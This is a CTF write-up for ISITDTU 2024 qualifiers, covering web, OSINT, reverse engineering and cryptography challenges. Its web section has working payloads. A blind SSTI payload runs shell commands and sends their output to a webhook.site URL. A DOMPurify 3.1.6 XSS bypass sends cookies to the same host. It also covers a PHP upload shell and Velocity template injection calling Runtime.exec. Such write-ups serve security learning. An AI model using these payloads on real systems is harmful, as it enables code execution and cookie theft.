# Writeups ISITDTU 2024 (Quals) - ph1sher
> "We participated in the ISITDTU CTF 2024 competition, finishing in 15th place out of 315 teams with 21 challenges successfully solved. So f^cking great!" - sondt

![image](https://hackmd.io/_uploads/SJq-djie1e.png)


## Web
### Another one
![image](https://hackmd.io/_uploads/B11n6cjxkg.png)

Review the src code

```py
@app.route('/register', methods=['POST'])
def register():
    json_data = request.data
    if "admin" in json_data:
        return jsonify(message="Blocked!")
    data = ujson.loads(json_data)
    username = data.get('username')
    password = data.get('password')
    role = data.get('role')
    
    if role !="admin" and role != "user":
        return jsonify(message="Never heard about that role!")
    
    if username == "" or password == "" or role == "":
        return jsonify(messaage="Lack of input")
    
    if register_db(connection, username, password, role):
        return jsonify(message="User registered successfully."), 201
    else:
        return jsonify(message="Registration failed!"), 400

```

* The `/register` endpoint blocks any registration attempts that include the string "admin" in the raw JSON data (json_data).
* However, after this check, it uses ujson.loads(json_data) to parse the JSON.
* This means if we can encode "admin" in a way that it's not directly in json_data, we can bypass the check.

```json
{"username":"a","password":"a","role": "\u0061\u0064\u006d\u0069\u006e"}
```

![image](https://hackmd.io/_uploads/HJ2uC9slke.png)


Login with this account to obtain JWT Token

![image](https://hackmd.io/_uploads/H1tn09oe1g.png)



```python
@app.route('/render', methods=['POST'])
def dynamic_template():
    token = request.cookies.get('jwt_token')
    if token:
        try:
            decoded = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            role = decoded.get('role')

            if role != "admin":
                return jsonify(message="Admin only"), 403

            data = request.get_json()
            template = data.get("template")
            rendered_template = render_template_string(template)
            
            return jsonify(message="Done")

        except jwt.ExpiredSignatureError:
            return jsonify(message="Token has expired."), 401
        except jwt.InvalidTokenError:
            return jsonify(message="Invalid JWT."), 401
        except Exception as e:
            return jsonify(message=str(e)), 500
    else:
        return jsonify(message="Where is your token?"), 401

```

* The /render endpoint is accessible only to users with the role "admin".
* It accepts a template parameter and uses render_template_string(template) to render it.
* The rendered output isn't directly returned, but exceptions (errors) include messages that can be manipulated.

=> Blind SSTI => To view the command output we can create a webhook and send that to this endpoint 

```json!
{
  "template": "{{ url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://webhook.site/0139531b-9559-42d0-a71a-b43e039822c2/?flag=' + url_for.__globals__['os'].popen('ls').read()) }}"
}

```
![image](https://hackmd.io/_uploads/BJ0d1iieyl.png)

The payload running the `ls` command returns an error because the output contains control characters -> we can see the name of the flag file is `gnp6kw338gg6`

Now simply run the command `cat gnp6kw338gg6`

![image](https://hackmd.io/_uploads/H10Fbiilye.png)

![image](https://hackmd.io/_uploads/HkK5xsig1g.png)


```
ISITDTU{N0W_y0u_kn0w_h0w_T0_m4k3_1t_r3Fl3ct3d!!}
```

### X Éc Éc
![image](https://hackmd.io/_uploads/S15h6cigkx.png)


The version used is DOMPurify 3.1.6., in this tweet https://x.com/kinugawamasato/status/1843687909431582830 the payload has been fixed in DOMPurify version 3.1.7.

=> This is most likely the solution payload

Tried and successfully triggered XSS
![image](https://hackmd.io/_uploads/rJhSZojgkg.png)
```!
<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(document.domain)>">
```

Upgraded payload a bit for easier use

```!
<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=eval(atob('base 64 payload'))>">
```

And encode base64 this js script


```js
fetch('https://webhook.site/0139531b-9559-42d0-a71a-b43e039822c2?cookie=' + encodeURIComponent(document.cookie))
```

Save note and submit link for bot -> get the flag

![image](https://hackmd.io/_uploads/Sy6rGjig1l.png)

```
ISITDTU{d364c13b91d3bd0ecb3ffed49b229fc06b1208e8}
```

### S1mple
![image](https://hackmd.io/_uploads/rJSk0qig1e.png)

```dockerfile
FROM servertest2008/simplehttpserver:1.4

EXPOSE 80
RUN echo "flag_here" > /.htpasswd
CMD ["/bin/bash", "/start.sh"]
```

In docker image there are echo fake flag commands. This could be a hint of Confusion Attacks in apache

![image](https://hackmd.io/_uploads/SyhyKoieye.png)

Read more here: https://blog.orange.tw/posts/2024-08-confusion-attacks-en/


RewriteRule Flags used
```con
<VirtualHost *:80>
    DocumentRoot /var/www/html/src

    <FilesMatch "\.php$">
        SetHandler  "proxy:unix:/run/php/php7.0-fpm.sock|fcgi://localhost/"
    </FilesMatch>

    <Proxy "fcgi://localhost/" enablereuse=on max=10>
    </Proxy>

    <Directory /var/www/html/src/>
        Options FollowSymLinks
        AllowOverride All
    </Directory>


    RewriteEngine On
    RewriteRule  ^/website-(.*).doc$   /$1.html

    RewriteCond %{REQUEST_METHOD} OPTIONS
    RewriteRule ^(.*)$ $1 [R=200,L]

    ErrorLog ${APACHE_LOG_DIR}/error_php.log
    CustomLog ${APACHE_LOG_DIR}/access_php.log combined

</VirtualHost>
```
Investigate the provided Docker image. Realize that the root user has been acting suspiciously

```
...
git clone https://github.com/anouarbensaad/vulnx.git
...
mkdir cat VulnX.php
...
touch shell.php
chmod 777 shell.php 
...
```
Check folder /usr/share/vulnx/

![image](https://hackmd.io/_uploads/SygnW5jixJx.png)


Found that the file /usr/share/vulnx/shell/VulnX.php can be exploited to upload

```php
<html>
</html>

<?php

error_reporting(0);
set_time_limit(0);

if($_GET['Vuln']=="X"){
echo "<center><b>Uname:".php_uname()."<br></b>"; 
echo '<font color="black" size="4">';
if(isset($_POST['Submit'])){
    $filedir = "uploads/"; 
    $maxfile = '2000000';
    $mode = '0644';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
echo" <a href=$userfile_name><center><b>Uploaded Success ==> $userfile_name</b></center></a>";
}
}
else{
echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';

}
?>
```

However, the owner of these folders is root. While if using the web to upload, it will be in the ww-data user. However, the file /usr/share/vulnx/shell/uploads/shell.html is a "world writable" file.

![image](https://hackmd.io/_uploads/rJ3T5oslye.png)

=> We now can use `RewriteRule ^/website-(.*).doc$ /$1.html` and VulnX.php to upload a file to overwrite the shell.html file. But how to use the uploaded file to read the flag at `.htpasswd`.

Here the admin.php file

```php
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Page</title>
</head>
<body>
<h1>Welcome to the Admin Page</h1>

<?php
error_reporting(0);

if (isset($_GET['pages']) && !empty($_GET['pages']))
{
$page = "./pages/" . $_GET['pages'] . ".html";
include($page);
}
else
{
echo '<a href="?pages=1"> Link </a>';
}
?>
</body>
</html>
```

Contains an LFI vulnerability. However, to access admin.php, we need to go through Basic Auth due to the .htaccess file. We can bypass basic auth by using `admin.php%3Fooo.php` like in orange's blog. And then use this LFI vuln to view the shell.html file with bad content to get the flag from `.htpasswd`

Now we got the chain: Upload shell.html -> view this file using admin.php

![image](https://hackmd.io/_uploads/BkjcWnjl1l.png)

![image](https://hackmd.io/_uploads/ByiaZ2olJg.png)

*Something happened that I can't exploit on the server anymore. Only have the screenshot of the flag taken by my teammate @teebow1e*

![image](https://hackmd.io/_uploads/S1zSMnsgyl.png)


### hihi
![image](https://hackmd.io/_uploads/SyR-09ilJx.png)

This website uses spring boot and Velocity

```
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-test</artifactId>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>org.apache.velocity.tools</groupId>
        <artifactId>velocity-tools-generic</artifactId>
        <version>3.0</version>
    </dependency>
    <dependency>
        <groupId>org.apache.velocity</groupId>
        <artifactId>velocity-engine-core</artifactId>
        <version>2.3</version>
    </dependency>
</dependencies>
```

```java
@PostMapping(value = "/")
    @ResponseBody
    public String hello(@RequestParam("data") String data) throws IOException {
        String hexString = new String(Base64.getDecoder().decode(data));
        byte[] byteArray = Encode.hexToBytes(hexString);
        ByteArrayInputStream bis = new ByteArrayInputStream(byteArray);
        ObjectInputStream ois = new SecureObjectInputStream(bis);
        String name;
        try{
            Users user = (Users) ois.readObject();
            name= user.getName();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        if(name.toLowerCase().contains("#")){
            return "But... For what?";
        }
        String templateString = "Hello, " + name+". Today is $date";
        Velocity.init();
        VelocityContext ctx = new VelocityContext();
        LocalDate date = LocalDate.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy");
        String formattedDate = date.format(formatter);
        ctx.put("date", formattedDate);
        StringWriter out = new StringWriter();
        Velocity.evaluate(ctx, out, "test", templateString);
        return out.toString();
    }
```

The MainController class controls all the logic of the website. Basically, the website will work like this:

* A GET request at / that returns a simple "hey" string.
* A POST request at /, which receives a data parameter that undergoes base64 decoding, hex decoding, and deserialization into a Users object. -> Then use the getName method to get the username.
* The username will be put into a template and returned to the user


-> Can be SSTI. There are many articles about velocity SSTI but all of them need to use `#set` to create a variable then getClass and start using other java Classes from that.

* https://iwconnect.com/apache-velocity-server-side-template-injection/
* https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

But server has blocked the `#` character -> need a variable available to trigger the error. And right in MainController there is a variable `$data`

This is my the payload serialize, hex encode, base64 encode

```java
public class SerializationTest {
    public static void main(String[] args) {
        try {
            // Step 1: Create a Users object and set the name
            Users user = new Users();
            user.setName("payload");

            // Step 2: Serialize the Users object
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(user);
            oos.close();

            byte[] serializedBytes = baos.toByteArray();

            // Step 3: Convert serialized bytes to hex
            StringBuilder hexString = new StringBuilder();
            for (byte b : serializedBytes) {
                hexString.append(String.format("%02x", b));
            }

            // Step 4: Encode the hex string in base64
            String base64Encoded = Base64.getEncoder().encodeToString(hexString.toString().getBytes());
            System.out.println("Base64 Encoded Serialized Object: " + base64Encoded);

            // Step 5: Decode the base64 string, convert back from hex, and deserialize
            String decodedHex = new String(Base64.getDecoder().decode(base64Encoded));
            byte[] decodedBytes = Encode.hexToBytes(decodedHex);
            ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
            ObjectInputStream ois = new SecureObjectInputStream(bais);

            // Step 6: Deserialize the object
            Users deserializedUser = (Users) ois.readObject();
            System.out.println("Deserialized User Name: " + deserializedUser.getName());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
Again, the Flag file is named random -> need to run `ls` command to know the file name. Use this payload
```java!
user.setName("new String($date.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"ls\").getInputStream().readAllBytes())");
```
![image](https://hackmd.io/_uploads/B1YJIjseJl.png)

Convert array to readable ASCII characters:

![image](https://hackmd.io/_uploads/rkA8IojxJx.png)

So the name of the flag file is `m62dyeu1gr3t`. Now read flag with payload

```java!
user.setName("$date.getClass().forName('java.nio.file.Files').readAllLines($date.getClass().forName('java.nio.file.Paths').get('m62dyeu1gr3t'))");
```

![image](https://hackmd.io/_uploads/HJCsLise1e.png)

```
ISITDTU{We1come_t0_1s1tDTU_CTF}
```

### niceray
![image](https://hackmd.io/_uploads/BJ7mCqig1l.png)


*Update later*

## Osint
### Sparks
![image](https://hackmd.io/_uploads/SJ1Y65jlJl.png)


In this challenge, we need to identify the location where the video of burning buildings was filmed using a TikTok link …with precise coordinates.

https://www.tiktok.com/@juleko_o/video/7206026807483796741

In the video description of "Cháy toà nhà chọc trời ở Trung Quốc" along with the tag #china, it can be inferred that this location is somewhere in China.

![image](https://hackmd.io/_uploads/HkGltijl1e.png)

Since this is HOT information, we can search for details based on news articles on Google.

![image](https://hackmd.io/_uploads/r1FS2ije1g.png)


Fortunately, the publication date is March 3, 2023 (matching the video upload date), which allows me to confidently confirm that the article refers to this particular building.


> TPO - A large fire broke out at 11:11 p.m. on March 2 at a high-rise building under construction in the busy commercial district of `Tsim Sha Tsui` (Hong Kong, China).
> According to local authorities, as of the morning of March 3, no casualties were recorded. Police said about 130 people living in the nearby `Star Mansion`, `Far East Mansion` and `Chungking Mansions` have been evacuated., 

We can search for`Tsim Sha Tsui`, `Star Mansion`, `Far East Mansion`, and `Chungking Mansions` on Google Maps to narrow down the area. Additionally, by looking at other news articles, it appears the building is located on `Middle Road`.

![image-min](https://hackmd.io/_uploads/SyH1ynie1e.jpg)

At the angle of the video, I think the cameraman will be standing on top of a certain building behind the burning building.

![image](https://hackmd.io/_uploads/H1APJ2sl1e.png)

```
ISITDTU{22.2966, 114.1735}
```

### Home sweet home
![image](https://hackmd.io/_uploads/rkpoJ2ig1g.png)
> We have just received information from our spy that Arlen is also using an alias "arlen.nnnnnnnn". From this information, can you track down his home address?

So we need to search for information on arlen.nnnnnnnn on social media because, in the challenge `Two Steps Ahead`, it was mentioned that Arlen is addicted to social media. After searching, we found this guy's Instagram account.

![image](https://hackmd.io/_uploads/SkEAA2sl1g.png)

We have a total of four posts. What information can we gather from these four hints?

![image](https://hackmd.io/_uploads/BkMmypsekl.png)

![image](https://hackmd.io/_uploads/Bkgvkpigke.png)

In this post, I found a house. After using Google Images to identify it, I confirmed it as Centre culturel Calixa-Lavallée in Quebec, Canada, with the Google Maps link [here](https://maps.app.goo.gl/gC6u3kK37sxLoksv9). So, his house is about a 20-minute bike ride from this location.

![image](https://hackmd.io/_uploads/Bk5wepjlJe.png)

In this post, we can infer that his house is located near a school.

![image](https://hackmd.io/_uploads/BJky-pixkl.png)

In this post, he mentions that a pet shop is very close to his house, so we decided to use Google Images to identify the species of frog featured in the post and determine which shop sells it in Canada.

![image](https://hackmd.io/_uploads/rJPV-pse1g.png)


So, I used ChatGPT to search for stores in Quebec, Canada, that sell this type of frog, and Magazoo is the pet store that meets this criterion.

![image](https://hackmd.io/_uploads/rkSHGail1e.png)

![image](https://hackmd.io/_uploads/Sy60zpig1l.png)

https://maps.app.goo.gl/8KsQaAvVqs1BAg1z6. Checking Time?!

![image](https://hackmd.io/_uploads/B1KbNpigkx.png)

```
ISITDTU{45.547, -73.602}
```

## Reverse Engineering
### re01
![image](https://hackmd.io/_uploads/rJcT1noeyl.png)

This challenge basically hides íts actual flow in `TLS Callbacks` functions (call before `main`):
![image](https://hackmd.io/_uploads/BJRbe3ixJe.png)

I just have to patch the `IsDebuggerPresent()` and debug. Here is the solve script:
```python
s = [0x7C,0x66,0x7C,0x61,0x71,0x61,0x60,0x4E,0x76,0x5A,0x5B,0x52,0x47,0x54,0x41,0x46,0x6A,0x6C,0x5A,0x40,0x6A,0x66,0x5A,0x59,0x43,0x50,0x51,0x6A,0x61,0x79,0x66,0x6A,0x76,0x54,0x59,0x59,0x57,0x54,0x56,0x5E,0x6A,0x67,0x50,0x5,0x4,0x6A,0x7D,0x54,0x43,0x50,0x6A,0x73,0x40,0x5B,0x6A,0x0F,0x1C,0x48]

print("".join(chr(c ^ 0x35) for c in s))
```

`ISITDTU{Congrats_You_Solved_TLS_Callback_Re01_Have_Fun_:)}`

### animal
![image](https://hackmd.io/_uploads/HJgOeghogJl.png)

This challenge will load the `check_flag` from stack after some calculation so `IDA` cannot analyze and decompile it. So I have to debug to this function and analyze statically. To get into this funtion, our input must be 36 characters with some conditions:
```
input[8] = 'a'
input[17] = 'c'
input[18] = 'a'
input[19] = 't'
input[33] = input[34]
```

Here is a piece of the `check_flag` function after I debug into it:

![image](https://hackmd.io/_uploads/BkeiMnieJe.png)

Those instructions before `jnz` looks like equations so I write down into my note:

```
a[25] * a[27] * a[32] + a[1] * a[8] - a[29] == 0x83872
a[4] * a[10] * a[20] - a[6] - a[11] + a[7] == 0xA271A
a[31] * (a[16] - 1) - a[22] * a[30]  + a[14] == -2945
a[3] - a[9] - a[18] - a[11] - a[4] + a[33] == -191
a[29] * a[25] - a[8] + a[18] + a[30] + a[1] == 0x12F5
a[5] - a[2] * a[23] * a[14] * a[7] + a[13] == -86153321
a[10] * a[27] + a[12] * a[5] * a[9] + a[13] == 0xD54D2
a[21] * a[9] * a[18] - a[6] + a[3] + a[22] == 0x6E43C
a[23] * a[32] - a[4] + a[24] + a[34] + a[21] == 0x2486
a[17] - a[19] - a[26] - a[6] + a[35] + a[24] == 0x1B
a[19] * a[23] - a[3] + a[15] + a[13] + a[14] == 0x2BEF
a[12] * a[7] - a[15] - a[21] + a[17] + a[2] == 0x33F1
a[28] - a[0] - a[20] + a[35] + a[26] + a[8] == 0x10A
a[28] * a[12] - a[1] + a[0] + a[17] + a[2] == 0x28B6
a[19] * a[5] - a[34] - a[11] + a[15] + a[22] == 0x269B
(1 - a[20]) * a[16] + a[33] * a[10] - a[0] == -5604

a[33] == a[34]
2 * a[8] == 0xC2
a[0] == 'I'
a[1] == 'S'
a[2] == 'I'
a[3] == 'T'
a[4] == 'D'
a[5] == 'T'
a[6] == 'U'
a[7] == '{'
a[17] == 'c'
a[18] == 'a'
a[19] == 't'
a[35] == '}'

r9 = a[0]
r10 = a[33] * a[10]
r11 = a[15]
r12 = a[10]
r13 = a[22]
r14 = a[12]
r15 = a[20]
ebp = a[8]
esi = a[1]
edi = a[2]
eax = a[16]
ebx = a[17]
ecx = (1 - a[20]) * a[16] + a[33] * a[10] - a[0] == 0xFFFFEA1C
edx = a[28] * a[12] - a[1] + a[0] + a[17] + a[2] == 0x28B6
[rsp+40h] = edx = a[35]
[rsp+38h] = r14 = a[26]
```

The last step is to use `z3-solver` to find the flag. Script:
```python
from z3 import *

a = [Int(f'a[{i}]') for i in range(36)]

solver = Solver()

for i in range(36):
    solver.add(a[i] >= 0, a[i] <= 128)

solver.add(a[25] * a[27] * a[32] + a[1] * a[8] - a[29] == 0x83872)
solver.add(a[4] * a[10] * a[20] - a[6] - a[11] + a[7] == 0xA271A)
solver.add(a[31] * (a[16] - 1) - a[22] * a[30] + a[14] == -2945)
solver.add(a[3] - a[9] - a[18] - a[11] - a[4] + a[33] == -191)
solver.add(a[29] * a[25] - a[8] + a[18] + a[30] + a[1] == 0x12F5)
solver.add(a[5] - a[2] * a[23] * a[14] * a[7] + a[13] == -86153321)
solver.add(a[10] * a[27] + a[12] * a[5] * a[9] + a[13] == 0xD54D2)
solver.add(a[21] * a[9] * a[18] - a[6] + a[3] + a[22] == 0x6E43C)
solver.add(a[23] * a[32] - a[4] + a[24] + a[34] + a[21] == 0x2486)
solver.add(a[17] - a[19] - a[26] - a[6] + a[35] + a[24] == 0x1B)
solver.add(a[19] * a[23] - a[3] + a[15] + a[13] + a[14] == 0x2BEF)
solver.add(a[12] * a[7] - a[15] - a[21] + a[17] + a[2] == 0x33F1)
solver.add(a[28] - a[0] - a[20] + a[35] + a[26] + a[8] == 0x10A)
solver.add(a[28] * a[12] - a[1] + a[0] + a[17] + a[2] == 0x28B6)
solver.add(a[19] * a[5] - a[34] - a[11] + a[15] + a[22] == 0x269B)
solver.add((1 - a[20]) * a[16] + a[33] * a[10] - a[0] == -5604)

solver.add(a[33] == a[34])
solver.add(2 * a[8] == 0xC2)
solver.add(a[0] == ord('I'))
solver.add(a[1] == ord('S'))
solver.add(a[2] == ord('I'))
solver.add(a[3] == ord('T'))
solver.add(a[4] == ord('D'))
solver.add(a[5] == ord('T'))
solver.add(a[6] == ord('U'))
solver.add(a[7] == ord('{'))
solver.add(a[17] == ord('c'))
solver.add(a[18] == ord('a'))
solver.add(a[19] == ord('t'))
solver.add(a[35] == ord('}'))

if solver.check() == sat:
    model = solver.model()
    result = [model[a[i]].as_long() for i in range(36)]
    result_str = ''.join(chr(c) for c in result)
    print("Solution for array a:", result)
    print("Decoded string:", result_str)
else:
    print("No solution found.")

# Solution for array a: [73, 83, 73, 84, 68, 84, 85, 123, 97, 95, 103, 48, 108, 100, 101, 110, 95, 99, 97, 116, 95, 49, 110, 95, 121, 48, 117, 114, 95, 97, 114, 101, 97, 33, 33, 125]      
# Decoded string: ISITDTU{a_g0lden_cat_1n_y0ur_area!!}
```

`ISITDTU{a_g0lden_cat_1n_y0ur_area!!}`


### re02
![image](https://hackmd.io/_uploads/HkaixoolJx.png)

I recognized this as a challenge involving a NES (Nintendo) file, so I referred to several write-ups, particularly from Flare-On 2019 (challenge 6), which seemed quite similar but unfortunately doesn’t seem to provide much help for me in this case.

In a challenging moment, we discovered an extension for the Ghidra tool at https://www.retroreversing.com/nes-ghidra

![image](https://hackmd.io/_uploads/H138Gsol1x.png)

we can see that the following conditions are simple equations, which we can solve using Z3 to find the values for `IDAT_XXX`

```python
import z3

DAT_0300 = z3.BitVec('DAT_0300', 8)
DAT_0301 = z3.BitVec('DAT_0301', 8)
DAT_0302 = z3.BitVec('DAT_0302', 8)
DAT_0303 = z3.BitVec('DAT_0303', 8)
DAT_0304 = z3.BitVec('DAT_0304', 8)
DAT_0305 = z3.BitVec('DAT_0305', 8)
DAT_0306 = z3.BitVec('DAT_0306', 8)
DAT_0307 = z3.BitVec('DAT_0307', 8)
DAT_0308 = z3.BitVec('DAT_0308', 8)
DAT_0309 = z3.BitVec('DAT_0309', 8)
DAT_030a = z3.BitVec('DAT_030a', 8)
DAT_030b = z3.BitVec('DAT_030b', 8)
DAT_030c = z3.BitVec('DAT_030c', 8)
DAT_030d = z3.BitVec('DAT_030d', 8)
DAT_030e = z3.BitVec('DAT_030e', 8)
DAT_030f = z3.BitVec('DAT_030f', 8)

solver = z3.Solver()

solver.add(DAT_0300 + DAT_0301 + DAT_0302 == ord('J'))
solver.add(DAT_0301 + DAT_0302 + DAT_0303 == ord('D'))
solver.add(DAT_0302 + DAT_0303 + DAT_0304 == ord(';'))
solver.add(DAT_0303 + DAT_0304 + DAT_0305 == ord('C'))
solver.add(DAT_0304 + DAT_0305 + DAT_0306 == ord('C'))
solver.add(DAT_0305 + DAT_0306 + DAT_0307 == ord('?'))
solver.add(DAT_0306 + DAT_0307 + DAT_0308 == ord('B'))
solver.add(DAT_0307 + DAT_0308 + DAT_0309 == ord('='))
solver.add(DAT_0308 + DAT_0309 + DAT_030a == ord('C'))
solver.add(DAT_0309 + DAT_030a + DAT_030b == ord('?'))
solver.add(DAT_030a + DAT_030b + DAT_030c == ord('J'))
solver.add(DAT_030b + DAT_030c + DAT_030d == ord('Q'))
solver.add(DAT_030c + DAT_030d + DAT_030e == ord('J'))
solver.add(DAT_030d + DAT_030e + DAT_030f == ord('D'))

for var in [DAT_0300, DAT_0301, DAT_0302, DAT_0303, DAT_0304, 
            DAT_0305, DAT_0306, DAT_0307, DAT_0308, DAT_0309, 
            DAT_030a, DAT_030b, DAT_030c, DAT_030d, DAT_030e, DAT_030f]:
    solver.add(var >= 0, var <= 255)

if solver.check() == z3.sat:
    model = solver.model()
    result = [model[var].as_long() for var in [DAT_0300, DAT_0301, DAT_0302, DAT_0303, 
                                                DAT_0304, DAT_0305, DAT_0306, DAT_0307, 
                                                DAT_0308, DAT_0309, DAT_030a, DAT_030b, 
                                                DAT_030c, DAT_030d, DAT_030e, DAT_030f]]
    print("Values for DAT_030x:", result)
    
    flag = ''.join(chr(val) for val in result)
    print("Flag:", flag)
else:
    print("No solution found.")
```

In the result of this Z3 solver, we can choose `tuanlinhlinhtuan` because it has meaning.



![image](https://hackmd.io/_uploads/HJ8L7jsxkl.png)

Can see some char: `ISITDTU{`, `LAB_PPUDATA_8567` like as `printf` 

We can observe a loop that iterates 43 times, processing each character of the data set with the DAT value we just found as `tuanlinhlinhtuan`.

The pointer to the data was named `DAT_0310` in Ghidra so I checked the memory viewer in `Mesen` at address `0310` and found this:

![image](https://hackmd.io/_uploads/rkl5Qjiekg.png)


**Solve Script**
```python
hex_data = [
    0x20, 0x1D, 0x13, 0x01, 0x1B, 0x36, 0x0C, 0x09, 0x0F, 0x02, 0x31, 0x1C, 0x1C, 0x10, 0x3E, 0x00,
    0x11, 0x06, 0x15, 0x0B, 0x08, 0x36, 0x07, 0x0E, 0x33, 0x27, 0x2B, 0x3B, 0x2B, 0x1D, 0x00, 0x18,
    0x11, 0x2A, 0x07, 0x1B, 0x02, 0x07, 0x00, 0x06, 0x33, 0x53, 0x47
]

xor_key = "tuanlinhlinhtuan"

result = ""

for i in range(len(hex_data)):
    xor_value = hex_data[i] ^ ord(xor_key[i % len(xor_key)])
    result += chr(xor_value) 

print("Result after XOR:", result)
# Result after XOR: Throw_back_the_nested_if_NES_have_funnnn_:)
```

```
ISITDTU{Throw_back_the_nested_if_NES_have_funnnn_:)}
```

### The Chamber of Flag
![image](https://hackmd.io/_uploads/r19kl2olkl.png)
The first thing we have to bypass is the first check pass after we chooses `Login` option

![image](https://hackmd.io/_uploads/r1TjQtRxke.png)

We found the code at here, it use sha256 algorithm to encrypt the password

![image](https://hackmd.io/_uploads/Bkc0EtAxJl.png)

And the ciphertext here

![image](https://hackmd.io/_uploads/H1jIrtRxke.png)

After decrypt we got password
![image](https://hackmd.io/_uploads/BJKdrYRxJe.png)

In the next step, i try 5 options but only the option `flag` looks explorable, and finally i found the piece of code

![image](https://hackmd.io/_uploads/HkIQ8KCgkg.png)

But somehow the buffer of the flag isn't true, and we decide to look for it in the whole program, and when i look in the buffer `szNiceCatchFlag`, i found some bytes that may work, and they have 0xCAFE each 16 bytes, so i decide to combine 16 bytes into the full buffer 64 bytes

![image](https://hackmd.io/_uploads/rJfBwtCxke.png)

```
from Crypto.Cipher import AES
from binascii import unhexlify


key_hex = "26F2D45844BFDBC8E5A2AE67149AA6C50E897A2A48FBF479D1BFB9F0D4E24544"
iv_hex = "FF07ECD94D4435DB29DA952F2FC753C4"
ciphertext = [162, 175, 250, 94, 179, 80, 150, 111, 168, 185, 13, 43, 110, 149, 211, 85, 
              5, 201, 8, 139, 144, 81, 167, 197, 206, 129, 184, 128, 148, 144, 155, 34, 
              176, 70, 176, 126, 50, 165, 109, 161, 123, 174, 99, 29, 232, 51, 198, 239, 
              207, 205, 23, 57, 50, 9, 213, 10, 17, 221, 246, 30, 111, 48, 166, 3]


key = unhexlify(key_hex)
iv = unhexlify(iv_hex)


ciphertext_bytes = bytes(ciphertext)


cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext_bytes)


print("Plaintext:", plaintext)
```

And we got this
![image](https://hackmd.io/_uploads/BksKwYRlkl.png)




## Cryptography
### ShareMixer1
It's a SSS cryptosystem but the input is shuffled 

![image](https://hackmd.io/_uploads/r1JGYsieJl.png)

Along with that, we can query at most 256 numbers 

![image](https://hackmd.io/_uploads/SJbrKsilke.png)

To address the challenge, a straightforward approach is to send a sequence of 32 unique numbers with the following replication pattern: five numbers appear once, four numbers appear twice, three numbers appear three times, two numbers appear four times, two numbers appear five times, and all the remaning numbers appears once. With that, we need to bruteforce $5!*4!*3!*2!*2!$ in total to get the correct order. At the end, we get 32 corrected equations and a bit of linear algebra to solve
```python
import hashlib
import sys
from sage.all import *
from pwn import *
import itertools
from Crypto.Util.number import *

r = remote('35.187.238.100',5001)
r.recvuntil(b'suffix that: \n')
prefix = r.recvline()[16:32].decode()
print(prefix)

def find_suffix(prefix, target="000000"):
    for length in range(1, 6):  
        for suffix in itertools.product(string.ascii_letters + string.digits, repeat=length):
            suffix = ''.join(suffix)
            attempt = prefix + suffix
            hashed_value = hashlib.sha256(attempt.encode()).hexdigest()
            if hashed_value.startswith(target):
                return suffix
    return None


i = 0
s = find_suffix(prefix)
r.sendlineafter(b': ', s.encode())
l = 32

r.recvuntil(b'=')
p = eval(r.recvline())

R = Zmod(p)

choices = [i for i in range(1,l+1)]
querry = ''
for _ in range(5):
    querry += str(choices[_]) + " "

for _ in range(5, 5 + 4):
    querry += (str(choices[_]) + " ") * 2
    
for _ in range(9, 9 + 3):
    querry += (str(choices[_]) + " ") * 3
    
for _ in range(12, 12 + 2):
    querry += (str(choices[_]) + " ") * 4
    
for _ in range(14, 14 + 2):
    querry += (str(choices[_]) + " ") * 5
count = 6
for _ in range(16, 32):
    querry += (str(choices[_]) + " ") * count
    count += 1
    
xs = list(map(lambda x: int(x) % p, querry.split()))
m_query = {}
for x in xs:
    if x in m_query:
        m_query[x] += 1
    else:
        m_query[x] = 1


r.sendlineafter(b': ', querry.encode())

r.recvuntil(b'=')
shares = eval(r.recvline())

m = {}
for x in shares:
    if x in m:
        m[x] += 1
    else:
        m[x] = 1

# Sort the dictionary based on values
ordered_map = dict(sorted(m.items(), key=lambda item: item[1]))
M = [[power_mod(x,l - 1 - i,p) for i in range(l)] for x in range(1,l + 1)]
M = Matrix(R, M)
# Separate keys based on their count values
value = [k for k, v in ordered_map.items() if v > 5]
value1 = [k for k, v in ordered_map.items() if v == 1]
value2 = [k for k, v in ordered_map.items() if v == 2]
value3 = [k for k, v in ordered_map.items() if v == 3]
value4 = [k for k, v in ordered_map.items() if v == 4]
value5 = [k for k, v in ordered_map.items() if v == 5]
iterate = 0
# Iterate over permutations and combine them
for a in itertools.permutations(value1):
    for b in itertools.permutations(value2):
        for c in itertools.permutations(value3):
            for d in itertools.permutations(value4):
                for e in itertools.permutations(value5):
                    # Combine all permutations into a single list
                    shares_combined = vector(R,list(a) + list(b) + list(c) + list(d) + list(e) + value)
                    
                    res = M.solve_right(shares_combined)
                    print(iterate)
                    iterate += 1
                    for r in res:
                        if b'ISITDTU{' in long_to_bytes(int(r)):
                            print(long_to_bytes(int(r)))
                            exit(0)
```
```
ISITDTU{Mix1_a5850c98ad583157f0}
```
### ShareMixer2
This challenge is the same as the previous one but with a small modification: we can just querry at most 32 times. So obviously, we can't use the navie strategy here :( . 

![image](https://hackmd.io/_uploads/SkuKTjseJx.png)

